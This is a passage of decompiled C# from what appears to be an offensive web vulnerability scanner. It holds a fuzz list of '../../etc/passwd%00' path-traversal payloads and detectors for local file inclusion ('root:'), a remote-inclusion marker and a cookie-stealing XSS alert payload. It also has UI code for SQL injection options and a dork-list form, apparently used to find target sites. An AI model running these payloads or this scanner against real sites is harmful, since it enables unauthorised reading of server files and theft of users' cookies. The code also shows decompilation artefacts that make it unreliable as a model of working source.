      this.fuzzlist.Items.Add((object) "=../../../../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../../../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../../../../../../../../etc/passwd%00");
    }

    private void scnr_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      try
      {
        IEnumerator enumerator = this.GroupBox1.Controls.GetEnumerator();
        while (enumerator.MoveNext())
        {
          Control current = (Control) enumerator.Current;
          if (Operators.CompareString(current.Name, "proxyb", false) != 0)
            current.Enabled = true;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      try
      {
        IEnumerator enumerator = this.GroupBox2.Controls.GetEnumerator();
        while (enumerator.MoveNext())
        {
          Control current = (Control) enumerator.Current;
          if (Operators.CompareString(current.Name, "fsqli", false) != 0)
            current.Enabled = true;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      this.ProgressBar1.Value = 0;
      this.sc.Text = Conversions.ToString(0);
      this.fs.Text = Conversions.ToString(0);
    }

    private bool elfi(string src) => src.Contains("file not found") | src.Contains("error: the listener returned the following message: 404 not found") | src.Contains("http/1.0 404 object not found") | src.Contains("the file that you requested could not be found on this server. if you provided the url");

    private bool erfi(string src) => src.Contains("I 4m H3r3");

    private bool efuzzlfi(string src) => src.Contains("root:");

    private bool exss(string src) => src.Contains("\"><script>alert(document.cookie)</script>") || src.Contains("%22%22%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%22");

    private void progmax(int max)
    {
      if (this.ProgressBar1.InvokeRequired)
        this.Invoke((Delegate) new scanner.prgmax(this.progmax), (object) max);
      else
        this.ProgressBar1.Maximum = max;
    }

    private void ToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText(this.chkdlist.SelectedItem.ToString());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    private void proxyb_Click(object sender, EventArgs e) => MyProject.Forms.ListaDeDorks.Show();

    private void scanner_Load(object sender, EventArgs e)
    {
    }

    public delegate void _chkadder(string item);

    public delegate void progadd(int value);

    public delegate void _chkdadder(string lnk);

    public delegate void prgmax(int max);
  }
}
